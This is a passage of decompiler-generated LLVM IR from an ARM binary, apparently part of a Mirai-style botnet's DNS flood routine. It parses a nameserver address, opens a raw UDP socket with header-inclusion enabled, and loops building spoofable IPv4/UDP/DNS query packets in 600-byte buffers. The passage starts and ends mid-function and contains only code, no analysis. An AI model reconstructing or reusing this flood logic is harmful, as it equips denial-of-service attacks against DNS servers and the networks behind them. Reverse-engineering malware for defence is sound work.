  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* %sb.global-to-local, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  store i32 %v1_a768, i32* %sb.global-to-local, align 4
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_25d48.57, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
